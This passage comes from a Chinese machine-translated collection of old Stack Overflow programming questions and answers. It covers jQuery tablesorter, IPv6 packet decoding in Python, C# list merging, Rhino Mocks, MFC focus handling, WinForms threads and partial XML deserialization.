gridView.FooterRow.TableSection = TableRowSection.TableFooter;
}
} 
```

如果使用带有 runat="server" 属性的 html 表而不是 asp.net 服务器控件，看起来好像没有一种简单的方法可以防止 thead 标记不在 html 输出中呈现。您可以使用一些 JQuery 在文档准备好时将 thead 标签插入 DOM -

```
 //in script tags after JQuery and JQuery tablesorter src declarations
    $(function() 
    {
        $('#test').prepend(
        $('<thead></thead>').append($('#test tr:first').remove()) 
        );

        $("#test").tablesorter();
            //your table options
    });

//your html and asp markup
<table id="test" runat="server">
<thead><tr><th>1</th><th>2</th><th>3</th></tr></thead>
<tbody>  
<tr><td>my data 1.1</td><td>this data 1.2</td><td>that data 1.3</td></tr>
<tr><td>this data 2.1</td><td>that data 2.2</td><td>my data 2.3</td></tr>
<tr><td>that data 3.1</td><td>my data 3.2</td><td>this data 3.3</td></tr>
</tbody>
</table> 
```

输出这个，它与 tablesorter 一起正常工作-

```
<table id="test">
<thead>
<tr>
<th class="header">1</th>
<th class="header">2</th>
<th class="header headerSortDown">3</th>
</tr>
</thead>
<tbody>
<tr>
<td>this data 1.1</td>
<td>that data 1.2</td>
<td>my data 1.3</td>
</tr>
<tr>
<td>my data 2.1</td>
<td>this data 2.2</td>
<td>that data 2.3</td>
</tr>
<tr>
<td>that data 3.1</td>
<td>my data 3.2</td>
<td>this data 3.3</td>
</tr>
</tbody>
</table> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-16T00:11:41.163

从这个开始……

```
print("<table class='turnMeIntoTableSort'><tr><td>heading1</td><td>heading2</td></tr><tr><td>content1</td><td>content2</td></tr><tr><td>content3</td><td>content4</td></tr></table>"); 
```

然后这样做：

```
print("$(document).ready(){
         $('table.turnMeIntoTableSort > tr:first').wrap('<thead></thead>');
         $('table.turnMeIntoTableSort > tr:gt(1)').wrapAll('<tbody></tbody>');

         //now draw the tablesorter
         $('table.turnMeIntoTableSort').tablesorter();
       }"); 
```

# python - 用于 pcapy/impacket 的 IPv6 解码器

> ID：369764
> 
> 赞同：1
> 
> 时间：2008-12-15T21:25:32.323
> 
> 标签：python, ipv6, packet-capture, impacket, pcapy

我使用[pcapy](http://oss.coresecurity.com/projects/pcapy.html) / [impacket](http://oss.coresecurity.com/projects/impacket.html)库在 Python 中解码网络数据包。它有一个 IP 解码器，它知道 IPv4 数据包的语法，但显然没有 IPv6 解码器。

有人得到吗？

[Impacket](http://www.secdev.org/projects/scapy/)维护人员在私人通信中表示，从 Scapy 开始可能会更好

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-22T15:21:28.103

Impacket 维护者推荐的 Scapy 目前没有 IPv6 解码。但是有一个[非官方的扩展](http://namabiiru.hongo.wide.ad.jp/scapy6/)来这样做。

使用此扩展程序，它可以工作：

```
for packet in traffic:
  if packet.type == ETH_P_IPV6 or packet.type == ETH_P_IP:
    ip = packet.payload
    if (ip.version == 4 and ip.proto == UDP_PROTO) or \
       (ip.version == 6 and ip.nh == UDP_PROTO):
        if ip.dport == DNS_PORT and ip.dst == ns:
            all_queries = all_queries + 1 
```

但是对于大的痕迹来说它非常慢。所以，我可能不得不尝试 Impacket，甚至回到 C。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-07-02T21:15:57.567

您可能想查看[`dpkt`](http://code.google.com/p/dpkt/)另一个数据包解析/构建库。它是由[`pypcap`](http://code.google.com/p/pypcap/)不同的 libpcap 包装器的作者编写的，但不难让它与 pcapy 一起工作，看看它是否比 Scapy 更快。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2008-12-21T12:05:34.380

我以前从未使用过 pcapy，但我确实在 C 项目中使用过 libpcap。正如 pcapy 页面所述，它没有静态链接到 libcap，因此您可以升级到支持 IPv6 的更新版本。

根据[libpcap 更改日志](http://www.tcpdump.org/libpcap-changes.txt)，2008 年 10 月 27 日发布的 1.0 版具有默认 IPv6 支持（它应该具有更长的 IPv6，但现在默认使用该选项编译），因此您应该能够使用此选项捕获 IPv6 流量版本。最新的 pcapy 版本是从 2007 年 3 月 27 日开始的，所以它最多应该包括 2007 年 9 月 10 日发布的 0.9.8 版本的 libcap。

我不知道这是否足以让您能够捕获 IPv6 流量，因为 pcapy API 可能需要一些更改来支持它，而这在 pcapy 开发人员的屋顶上。

**更新**：显然[pylibpcap](http://sourceforge.net/projects/pylibpcap)是 libpcap 的 python 包装器，它的版本比 pcapy 更新，因此应该更好地支持更新的 libpcap 功能。

有关 PCAP (libpcap) 的更多信息，请[点击此处](http://en.wikipedia.org/wiki/Pcap)。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-06-27T19:43:23.427

您可以使用来自 google 的一个非常有用的单文件库

[http://code.google.com/p/ipaddr-py/](http://code.google.com/p/ipaddr-py/)

支持 IPv4、IPv6、ip 验证、网络掩码和前缀管理等。它的编码和文档都很好。

祝你好运
埃米利奥

# c++ - 了解 mingw/g++ 中的内存管理

> ID：369771
> 
> 赞同：0
> 
> 时间：2008-12-15T21:29:12.533
> 
> 标签：c++, memory-management, mingw

我被分配了一项基本解释这一点的任务。我快速浏览了编译器文档，它似乎是一个不错的起点，尽管它非常广泛而且我没有太多时间。我想知道我是否需要事先了解 C99 标准，或者我是否可以检查另一个好的来源。如果有任何不同，我将在 Windows 上使用它。我还理解简单的概念，例如堆、堆栈、链接等等。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T21:37:58.367

AFAIK，g++ 只是一个 C/C++ 编译器，仅此而已。内存根据标准 C/C++ 库进行管理。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T22:01:34.217

任何体面的 C/C++ 教程都应该提供这些信息的基础知识——但是 C/C++ 中的内存管理是一个***巨大***的话题。当然，对于入门级课程，您的讲师会提供一些指导，并且可能会提供更具体，更不开放的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-16T00:19:28.307

这个问题我不是很清楚。如果通过“了解 mingw/g++ 中的内存管理”是指“了解 mingw g++ 编译器在编译文件时如何在内部处理内存，例如它何时分配和释放抽象语法树节点等”）那么你的答案是作为多遍编译器，GCC 可能不知道任何特定数据的最佳生命周期，但它确实知道从一个遍到另一遍不需要大量对象，[因此它尽可能使用内存池和垃圾收集其他地方](http://www.airs.com/blog/archives/185)。

另一方面，如果您询问“如何/何时/以什么顺序......对象、函数、变量等被放入堆栈......分配了什么以及何时以及如何影响性能”那么你'在一个漫长的夜晚浏览代码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T23:14:10.653

g++ 只是一个编译器。它遵循它编译的语言的规则（在 G++ 的情况下是 C++，但你也提到了 C99）。

对于您相当具体的问题，您可能需要

*   查阅语言标准（对于 C++，这是 ISO/IEC 14882）。不幸的是不是免费的，但你可以在网上免费找到基本上和真品一样好的草稿。最新的官方版本是 C++2003 (ISO/IEC 14882-2003)，但与原来的 '89 相比只包含非常小的变化。C++09 也接近完成，网上也有草稿可用。但是请注意，这是大量阅读，除非您已经非常熟悉该语言，否则我不建议您尝试在那里找到任何东西。
*   分析编译器生成的汇编代码。该标准在实现方面留下了很多东西，因此找出 G++ 如何具体将事物推送到堆栈上的唯一方法是分析它生成的代码。（另请注意，这可能会在不同版本的 G++ 之间发生变化）

C++ 是一种众所周知的未指定语言。标准没有涵盖大量的块，编译器可以自由地做它喜欢的事情。这使得准确找出给定编译器在幕后所做的工作有点挑战。

出于这个原因，您还应该确保您确切地知道您应该做什么。挖掘有关该*语言*对内存管理的描述，或者*g++*如何专门处理它的信息？

# c# - C#中的联合两个列表

> ID：369776
> 
> 赞同：1
> 
> 时间：2008-12-15T21:30:08.383
> 
> 标签：c#, gridview, rowcommand

我想合并，合并到一个包含两个引用的列表中，所以这是我的代码，我如何定义一个为这个海豚准备的列表？

```
if (e.CommandName == "AddtoSelected")
{
    List<DetalleCita> lstAux = new List<DetalleCita>();
    foreach (GridViewRow row in this.dgvEstudios.Rows)
    {
        var GridData = GetValues(row);
        var GridData2 = GetValues(row);
        IList AftList2 = GridData2.Values.Where(r => r != null).ToList();
        AftList2.Cast<DetalleCita>();
        chkEstudio = dgvEstudios.Rows[index].FindControl("ChkAsignar") as CheckBox;
        if (chkEstudio.Checked)
        {

            IList AftList = GridData.Values.Where(r => r != null).ToList();
            lstAux.Add(
            new DetalleCita
            {
                codigoclase = Convert.ToInt32(AftList[0]),
                nombreestudio = AftList[1].ToString(),
                precioestudio = Convert.ToDouble(AftList[2]),
                horacita = dt,
                codigoestudio = AftList[4].ToString()
            });
        }
        index++;
        //this line to merge
        lstAux.ToList().AddRange(AftList2);
    }

    dgvEstudios.DataSource = lstAux;
    dgvEstudios.DataBind();
} 
```

这是在 rowcommand 事件中。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-15T22:03:45.367

如果你想添加所有条目`AftList2`，`lstAux`你应该定义`AftList2`为 IEnumerable<> 类型的元素`DetalleCita`（`IEnumerable<DetalleCita>`足以用作`AddRange()`on的参数`List<DetalleCita>`）。例如像这样：

```
var AftList2 = GridData2.Values.Where(r => r != null).Cast<DetalleCita>(); 
```

然后您可以将其所有元素添加到`lstAux`：

```
lstAux.AddRange(AftList2); 
```

澄清：

我认为您误解了扩展方法`ToList()`的作用。它从中**创建**新列表`IEnumerable<T>`，其结果与`IEnumerable<T>`它所应用的原始列表无关。

这就是为什么你只是没有做任何有用的尝试`list.ToList().AddRange(...)`- 你正在将列表复制到（另一个新创建的`ToList()`）列表，更新它然后基本上扔掉它（因为你甚至没有做类似的事情`list2 = var1.ToList()`，之后原始`var1`保持不变！ !!`ToList()`如果您调用它，您很可能希望保存结果）。

此外，您通常不需要将一个列表转换为另一个列表，`ToList()`当您需要列表 ( `List<T>`) 但具有`IEnumerable<T>`（不可索引且您可能需要通过索引快速访问或延迟评估但您需要在此计算的所有结果时）很有用time -- 尝试使用 LINQ to objects 查询的结果时可能会出现这两种情况，例如：`IEnumerable<int> ints = from i in anotherInts where i > 20 select i;`-- 即使查询结果`anotherInts`不能**转换为**，因为它不是列表而是实现。在这种情况下，您可以使用获取列表无论如何：）。`List<int>``ints` **`List<int>``IEnumerable<int>``ToList()``List<int> ints = (from i in anotherInts where i > 20 select i).ToList();`**

 **更新：

如果您真的是指联合语义（例如，对于 { 1, 2 } 和 {1, 3 }，*联合*将类似于 {1, 2, 3 }，两个集合中没有相同元素的重复）考虑切换到`HashSet<T>`（它很可能在您的情况下可用，因为您使用的是 C# 3.0 并且我想您有最近的 .NET 框架）或使用`Union()`扩展方法而不是`AddRange`（我认为这并不比第一个解决方案更好，并且要小心，因为它更像是`ToList()`- `a.Union(b)`返回新集合并且不更新`a`或`b`）。

# c# - Rhino Mocks Exception Expect #1 Actual #0 : 需要帮助

> ID：369777
> 
> 赞同：4
> 
> 时间：2008-12-15T21:30:42.937
> 
> 标签：c#, exception, rhino-mocks

我已经对此进行了搜索，这似乎是一个包罗万象的内容，不幸的是，我读过的所有内容都无济于事。这是课程：

```
public interface IMockInterface
{
    MockClass MockedMethod();
    MockClass MockThis();
}

public class MockClass : IMockInterface
{
  public virtual MockClass MockedMethod()
  {
    MockClass returnValue;

    returnValue = new MockClass();
    returnValue.SomeMessage = "Not mocked";
    return returnValue;
  }

  public MockClass MockThis()
  {
    MockClass mock;
    MockClass returnValue;

    mock = new MockClass();

    return mock.MockedMethod();
  }
} 
```

和测试：

```
public void MockTest_Internal()
{
  MockClass mainClass;
  MockClass returnedClass;
  IMockInterface mockProvider;

  mainClass = new MockClass();

  mockProvider = repository.StrictMock<IMockInterface>();
  Expect.Call(mockProvider.MockedMethod())
    .Return(new MockClass { SomeMessage = "Mocked" });
  repository.ReplayAll();

  returnedClass = mainClass.MockThis();
  provider.AssertWasCalled(item => item.MockedMethod());

  Assert.IsTrue(returnedClass.SomeMessage == "Mocked");
} 
```

**也试过了，还是不行**

但我不断收到这个异常：

Rhino.Mocks.Exceptions.ExpectationViolationException:
IMockInterface.MockedMethod(); 预期 #1，实际 #0

现在，从我所读到的内容来看，这表明要么使用与预期参数不同的方法调用了该方法，要么从未调用过该方法，但预计会调用该方法。这不是测试的情况。

旁注：这是我第一次真正使用没有内部代码的 Rhino.Mocks，所以我基本上是边走边学。这里可能有一些非常愚蠢的东西......

**这是评论过的旧测试，但不是我应该使用的：**

```
public void MockTest_Internal()
{
  MockClass mainClass;
  MockClass returnedClass;
  IMockInterface mockProvider;

  mainClass = new MockClass();

  var provider = MockRepository.GenerateStub<IMockInterface>();
  provider.Stub(item => item.MockedMethod())
    .Return(new MockClass { SomeMessage = "Mocked" });

  returnedClass = mainClass.MockThis();
  provider.AssertWasCalled(item => item.MockedMethod());

  Assert.IsTrue(returnedClass.SomeMessage == "Mocked");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T21:55:53.183

您告诉模拟框架在提供程序对象上存根 MockedMethod 类，但您从未将提供程序注入要使用的 mainClass 对象。我不清楚您要完成什么，但是如果您希望调用模拟方法，则必须在设置存根的对象上调用它。

如果你定义`MockThis`如下，我想你会发现它会起作用。

```
public MockClass MockThis(IMockInterface provider)
{
    return provider.MockMethod();
} 
```

底线是您得到异常，因为从未在提供程序上调用该方法，仅在 mainClass 对象上调用。

**编辑**：示例

```
public class ClassUnderTest
{
    private ProviderClass provider { get; set; }

    public ClassUnderTest( ProviderClass provider )
    {
        this.Provider = provider;
    }

    public int DoOperation()
    {
        return this.Provider.ProviderOperation();
    }
}

public class ProviderClass
{
    private int value = 42;
    public ProviderClass()
    {
    }

    public virtual int ProviderOperation()
    {
        return this.value;
    }
}

[TestMethod]
public void DoOperationTest()
{
     ProviderClass mockProvider = MockRepository.GenerateMock<ProviderClass>();
     mockProvider.Expect( mp => mp.ProviderOperation() ).Return( -1 );

     ClassUnderTest target = new ClassUnderTest( mockProvider );

     int expectedValue = -1;
     int value = target.DoOperation();

     Assert.AreEqual( expectedValue, value );

     mockProvider.VerifyAllExpectations();
} 
```

通常 ProviderClass 对象会从 ProviderOperation 方法返回 42，但我们已经模拟了它并告诉它返回 -1。当调用 ClassUnderTest DoOperation 方法时，将调用模拟提供程序对象的 ProviderOperation 方法并返回模拟值 -1。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-03-12T14:03:02.183

当使用我在测试中构建的对象参数调用存根方法时，我通常会收到此错误，并且在测试代码中，该对象是在调用该方法之前构建的。解决方案是使用`Rhino.Mocks Matches()`.

前任：

```
Arg<string>.Matches(s => s.Contains("some substring")) 
```

# c++ - 如何将焦点设置为 CButton，以便边框和焦点虚线可见？

> ID：369788
> 
> 赞同：1
> 
> 时间：2008-12-15T21:34:50.230
> 
> 标签：c++, mfc, setfocus, cdialog, cbutton

我创建了一个简单的基于对话框的应用程序，并在默认的 CDialog 中使用 Visual Studio 编辑器添加了三个按钮（通过拖放它们）。

默认的确定和取消按钮也在那里。

当我单击按钮 3 时，我想将焦点设置到按钮 1。

我在 muy 按钮的属性中将属性 Flat 设置为 true。

我编码了这个：

```
void CbuttonfocusDlg::OnBnClickedButton3()
{
    // TODO: Add your control notification handler code here
    GetDlgItem(IDC_BUTTON1)->SetFocus();

    Invalidate();

} 
```

但是 button1 中的边框从未被绘制。只有在单击按钮 3 之前按 TAB 键时才会绘制插入符号（表示焦点的虚线）。

我希望按钮看起来与单击后的外观完全相同。以编程方式显示按钮内的虚线将是一个加号。

我想要的是：

[![http://i33.tinypic.com/11t8pkl.png](https://i.stack.imgur.com/z8l0f.png)](https://i.stack.imgur.com/z8l0f.png)

我得到什么：

[![http://i37.tinypic.com/160q5hw.png](https://i.stack.imgur.com/CgqLi.png)](https://i.stack.imgur.com/CgqLi.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-16T22:51:21.230

使用`WM_NEXTDLGCTL`.

请参阅[Reymond Chen 的“如何在对话框中设置焦点”](http://blogs.msdn.com/oldnewthing/archive/2004/08/02/205624.aspx)：

```
void SetDialogFocus(HWND hdlg, HWND hwndControl)
{
    SendMessage(hdlg, WM_NEXTDLGCTL, (WPARAM)hwndControl, TRUE);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T21:47:43.417

通过调用 UpdateWindow，在焦点更改生效之前重绘按钮。Invalidate 本身就足够了，当一切安定下来时，窗口将被重新粉刷。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-16T15:54:22.680

这会在按钮周围绘制粗边框：

```
static_cast<CButton*>(GetDlgItem(IDC_BUTTON1))->SetButtonStyle(BS_DEFPUSHBUTTON); 
```

一个更优雅的方法是在 CbuttonfocusDlg 中定义一个 CButton 成员变量并将其关联到 IDC_BUTTON1 控件，然后调用

```
this->m_myButton.SetButtonStyle(BS_DEFPUSHBUTTON); 
```

这使我设置焦点的按钮成为默认按钮，但请注意，当焦点转到不是按钮的控件（对话框内）时，默认按钮再次成为在对话框资源，在本例中为“确定”按钮。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-06-24T01:58:50.560

我遵循乔尔的建议。但与该链接中使用的 API 略有不同，我的是：

PostMessage(WM_NEXTDLGCTL, (WPARAM)(pwnd->GetSafeHwnd()), TRUE);

# winforms - 如何在自己的线程上创建表单并在整个应用程序生命周期中保持打开状态

> ID：369790
> 
> 赞同：3
> 
> 时间：2008-12-15T21:35:48.700
> 
> 标签：winforms, multithreading

我正在创建一个小测试组件并遇到问题

基本上，该组件是一个控制对数据库的所有访问的类的装饰器，它创建一个带有两个按钮的表单：“模拟丢失的连接”和“重新连接”。按下按钮，而不是让函数调用通过包装器开始抛出 NoConnectionException() 漂亮而简单，并且对测试很有帮助。

问题是这个特定的应用程序在检测到连接丢失时会引发一个模式对话框“连接丢失！” 它一直在那里，直到重新连接。因为它是模态的，所以我无法按下漂亮的按钮来模拟重新获得的连接。

因此，我需要做的是在不同的线程中运行我的小测试表单。我不确定该怎么做。我试过

```
new Thread(
  new ThreadStart(
    (Action)delegate {_form.Start();}
  )
).Start(); 
```

但是一旦方法返回，线程就会关闭，因此除了瞬间之外，表单永远不会出现。

知道如何实现我想要的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T22:00:53.673

您将需要在新创建的线程上启动消息循环。您可以通过调用 Application.Run(form) 来做到这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T22:01:42.687

尝试

```
new Thread(
  new ThreadStart((Action)delegate {
        _form.Start();
        System.Windows.Forms.Application.Run();
    }
  )
).Start(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T21:55:26.553

听起来你没有坚持你的线程。它是一个对象，就像其他所有东西一样，所以如果它的范围仅限于您的方法，那么一旦您的方法退出，它就会超出范围。尝试将其设为实例变量。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-11-09T13:57:56.770

```
showdialog :
System.Threading.Thread t = new System.Threading.Thread(new form1().ShowDialog());
t.Start(); 
```

# c# - 如何在 C# 中仅反序列化 XML 文档的一部分

> ID：369792
> 
> 赞同：31
> 
> 时间：2008-12-15T21:36:23.707
> 
> 标签：c#, xml, xml-serialization, serialization

这是我要解决的问题的一个虚构示例。如果我在 C# 中工作，并且有这样的 XML：

```
<?xml version="1.0" encoding="utf-8"?>
<Cars>
  <Car>
    <StockNumber>1020</StockNumber>
    <Make>Nissan</Make>
    <Model>Sentra</Model>
  </Car>
  <Car>
    <StockNumber>1010</StockNumber>
    <Make>Toyota</Make>
    <Model>Corolla</Model>
  </Car>
  <SalesPerson>
    <Company>Acme Sales</Company>
    <Position>
       <Salary>
          <Amount>1000</Amount>
          <Unit>Dollars</Unit>
    ... and on... and on....
  </SalesPerson>
</Cars> 
```

SalesPerson 中的 XML 可能非常长，大小为兆字节。我想反序列化标记，**但**不反序列化 SalesPerson XML 元素，而是将其保持为原始形式“供以后使用”。

本质上，我希望能够将其用作 XML 的对象表示。

```
[System.Xml.Serialization.XmlRootAttribute("Cars", Namespace = "", IsNullable = false)]
public class Cars
{
    [XmlArrayItem(typeof(Car))]
    public Car[] Car { get; set; }

    public Stream SalesPerson { get; set; }
}

public class Car
{
    [System.Xml.Serialization.XmlElementAttribute("StockNumber")]
    public string StockNumber{ get; set; }

    [System.Xml.Serialization.XmlElementAttribute("Make")]
    public string Make{ get; set; }

    [System.Xml.Serialization.XmlElementAttribute("Model")]
    public string Model{ get; set; }
} 
```

其中，Cars 对象上的 SalesPerson 属性将包含一个流，其中包含在通过 XmlSerializer 运行后位于 <SalesPerson> xml 元素中的原始 xml。

这可以做到吗？我可以选择仅反序列化 xml 文档的“一部分”吗？

谢谢！-麦克风

ps 示例 xml 从[How to Deserialize XML 文档中窃取](https://stackoverflow.com/questions/364253/how-to-deserialize-xml-document)

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2010-02-12T11:53:47.950

这可能是一个有点旧的线程，但无论如何我都会发布。我遇到了同样的问题（需要从一个超过 1MB 的文件中反序列化 10kb 的数据）。在主对象（它有一个需要反序列化器的 InnerObject）中，我实现了一个 IXmlSerializable 接口，然后更改了 ReadXml 方法。

我们有 xmlTextReader 作为输入，第一行是读取到一个 XML 标记：

```
reader.ReadToDescendant("InnerObjectTag"); //tag which matches the InnerObject 
```

然后为我们要反序列化的对象类型创建 XMLSerializer 并对其进行反序列化

```
XmlSerializer   serializer = new XmlSerializer(typeof(InnerObject));

this.innerObject = serializer.Deserialize(reader.ReadSubtree()); //this gives serializer the part of XML that is for  the innerObject data

reader.close(); //now skip the rest 
```

这节省了我大量反序列化的时间，并允许我只读取 XML 的一部分（只是描述文件的一些细节，这可能有助于用户确定文件是否是他想要加载的文件）。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-04-14T07:05:00.710

user271807接受的[答案](https://stackoverflow.com/a/2251545/193414)是一个很好的解决方案，但我发现，我还需要设置片段的 xml 根，以避免出现内部异常的异常，如下所示：

```
...xmlns=''> was not expected 
```

当我尝试仅反序列化此 xml 文档的内部 Authentication 元素时，出现了此异常：

```
<?xml version=""1.0"" encoding=""UTF-8""?>
<Api>
  <Authentication>                       
      <sessionid>xxx</sessionid>
      <errormessage>xxx</errormessage>                
  </Authentication>
</ApI> 
```

所以我最终创建了这个扩展方法作为一个可重用的解决方案**- 警告包含内存泄漏，见下文：**

```
public static T DeserializeXml<T>(this string @this, string innerStartTag = null)
        {
            using (var stringReader = new StringReader(@this))
            using (var xmlReader = XmlReader.Create(stringReader)) {
                if (innerStartTag != null) {
                    xmlReader.ReadToDescendant(innerStartTag);
                    var xmlSerializer = new XmlSerializer(typeof(T), new XmlRootAttribute(innerStartTag));
                    return (T)xmlSerializer.Deserialize(xmlReader.ReadSubtree());
                }
                return (T)new XmlSerializer(typeof(T)).Deserialize(xmlReader);
            }
        } 
```

**2017 年 3 月 20 日更新：正如下面的评论所指出的，使用 XmlSerializer 的构造函数之一时存在内存泄漏问题，因此我最终使用了如下所示的缓存解决方案：**

```
 /// <summary>
    ///     Deserialize XML string, optionally only an inner fragment of the XML, as specified by the innerStartTag parameter.
    /// </summary>
    public static T DeserializeXml<T>(this string @this, string innerStartTag = null) {
        using (var stringReader = new StringReader(@this)) {
            using (var xmlReader = XmlReader.Create(stringReader)) {
                if (innerStartTag != null) {
                    xmlReader.ReadToDescendant(innerStartTag);
                    var xmlSerializer = CachingXmlSerializerFactory.Create(typeof (T), new XmlRootAttribute(innerStartTag));
                    return (T) xmlSerializer.Deserialize(xmlReader.ReadSubtree());
                }
                return (T) CachingXmlSerializerFactory.Create(typeof (T), new XmlRootAttribute("AutochartistAPI")).Deserialize(xmlReader);
            }
        }
    }
/// <summary>
///     A caching factory to avoid memory leaks in the XmlSerializer class.
/// See http://dotnetcodebox.blogspot.dk/2013/01/xmlserializer-class-may-result-in.html
/// </summary>
public static class CachingXmlSerializerFactory {
    private static readonly ConcurrentDictionary<string, XmlSerializer> Cache = new ConcurrentDictionary<string, XmlSerializer>();
    public static XmlSerializer Create(Type type, XmlRootAttribute root) {
        if (type == null) {
            throw new ArgumentNullException(nameof(type));
        }
        if (root == null) {
            throw new ArgumentNullException(nameof(root));
        }
        var key = string.Format(CultureInfo.InvariantCulture, "{0}:{1}", type, root.ElementName);
        return Cache.GetOrAdd(key, _ => new XmlSerializer(type, root));
    }
    public static XmlSerializer Create<T>(XmlRootAttribute root) {
        return Create(typeof (T), root);
    }
    public static XmlSerializer Create<T>() {
        return Create(typeof (T));
    }
    public static XmlSerializer Create<T>(string defaultNamespace) {
        return Create(typeof (T), defaultNamespace);
    }
    public static XmlSerializer Create(Type type) {
        return new XmlSerializer(type);
    }
    public static XmlSerializer Create(Type type, string defaultNamespace) {
        return new XmlSerializer(type, defaultNamespace);
    }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-15T21:58:12.883

您可以通过在类中实现 ISerializable 接口来控制序列化的完成方式。请注意，这也意味着具有方法签名（SerializationInfo 信息，StreamingContext 上下文）的构造函数，并确保您可以按照您的要求进行操作。

但是，请仔细查看您是否真的需要使用流式传输来执行此操作，因为如果您不必使用流式传输机制，那么使用 Linq to XML 实现相同的事情会更容易，并且更容易长期维护术语（海事组织）

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-15T22:57:29.237

我认为前面的评论者在他的评论中是正确的，即 XML 可能不是这里后备存储的最佳选择。

如果您遇到规模问题并且没有利用 XML 获得的其他一些优点，例如转换，那么最好使用数据库来存储您的数据。您所做的操作似乎更适合该模型。

我知道这并不能真正回答您的问题，但我想我会强调您可能使用的替代解决方案。一个好的数据库和适当的 OR 映射器（如 .netTiers、NHibernate 或最近的 LINQ to SQL / Entity Framework）可能会让您在对代码库的其余部分进行最小更改的情况下恢复并运行。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-15T21:58:21.540

通常 XML 反序列化是一个开箱即用的全有或全无的命题，因此您可能需要自定义。如果您不进行完全反序列化，您将面临 xml 在 SalesPerson 元素中格式错误的风险，因此文档无效。

如果您愿意接受这种风险，您可能需要进行一些基本的文本解析，以使用纯文本处理工具将 SalesPerson 元素分解为不同的文档，然后处理 XML。

这是一个很好的例子，说明了为什么 XML 并不总是正确的答案。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-07-27T18:42:36.930

请尝试将 SalesPerson 属性定义为 type `XmlElement`。这适用于使用 XML 序列化的 ASMX Web 服务的输出。我认为它也适用于输入。我希望整个`<SalesPerson>`元素都以`XmlElement`.

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-15T23:39:42.957

**您可以通过在 Cars 类上实现IXmlSerializable**接口来控制对 Cars 类的哪些部分进行反序列化，然后在*ReadXml(XmlReader)*方法中读取和反序列化 Car 元素，但是当您到达 SalesPerson 元素时，您将读取它的子树作为一个字符串，然后使用 StreamWriter 在文本内容上构造一个 Stream。

如果您从不希望 XmlSerializer 写出 SalesPerson 元素，请使用 [XmlIgnore] 属性。当您将 Cars 类序列化为其 XML 表示时，我不确定您想要发生什么。您是否试图仅阻止 SalesPerson 的反序列化，同时仍然能够序列化由 Stream 表示的 SalesPerson 的 XML 表示？

如果你想要一个具体的实现，我可能会提供一个代码示例。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-07-27T18:40:07.293

如果您只想解析 SalesPerson 元素但将其保留为字符串，则应使用 Xsl Transform 而不是“反序列化”。另一方面，如果您想解析 SalesPerson 元素并仅从所有其他非 SalesPerson 元素填充内存中的对象，那么 Xsl Transform 也可能是要走的路。如果文件很大，您可以考虑将它们分开并使用 Xsl 组合不同的 xml 文件，以便销售人员 I/O 仅在您需要时发生。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-08-06T10:39:43.397

我建议您使用任何轻量级方法（如 XmlReader、XPathDocument 或 LINQ-to-XML）手动读取 Xml。

当您只需要读取 3 个属性时，我想您可以编写从该节点手动读取的代码，并完全控制它的执行方式，而不是依赖于序列化/反序列化

# c - 用于记录 C 结构的程序？

> ID：369793
> 
> 赞同：2
> 
> 时间：2008-12-15T21:37:11.987
> 
> 标签：c, struct, documentation-generation

如果您有一个被描述为 C 结构的二进制文件格式（或数据包格式），是否有任何程序可以解析该结构并将其转换为您的协议的整洁文档？

该结构当然会包含数组、其他结构等，这是描述格式所必需的。文档可能需要包括打包、字节顺序等内容。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-15T21:46:39.287

也许你应该换一种方式思考这个问题。

“我可以为我的数据包创建一个文档格式，我可以为其生成一个 C 结构吗？”

例如，考虑使用 XML 来定义数据包结构并添加注释元素等。编写一个将其转换为实际 C 结构的简单程序将相当容易

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-15T21:45:46.947

[Doxygen是](http://www.doxygen.nl/)**一种**常用的**文档**生成器。但是，如果您想获得有用的文档，您可能必须使用文档注释标记您的结构定义。

 *** * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T22:29:44.130

如果你知道 perl，你可以尝试玩 Jeeves：

[https://www.rodhughes.com/perl/advprog/examples/Jeeves/](https://www.rodhughes.com/perl/advprog/examples/Jeeves/)

（这个来源就在那里；我认为它可以使用。；））

我正在尝试解决类似于您需要的东西：结构化二进制数据的解析器。我期待 Jeeves 从元格式输出 C++ 中的解析类。Jeeves 的默认解析器允许为类定义的每个成员添加额外的标签。这将让您在类中的注释中自动包含有关字节顺序、对齐方式等的信息（当然，在您的代码中实现它们）。

# asp.net-mvc - 在 ASP.net MVC 中良好且完整地实现 RSS 提要

> ID：369794
> 
> 赞同：2
> 
> 时间：2008-12-15T21:37:19.523
> 
> 标签：asp.net-mvc, rss

我在 ASP.NET MVC 中看到了一些 RSS 源的示例，例如[this](https://stackoverflow.com/questions/11915/rss-feeds-in-aspnet-mvc)，以及项目中的一些示例（例如 Oxite），但它们都不完整。

例如。他们都没有检查标题

```
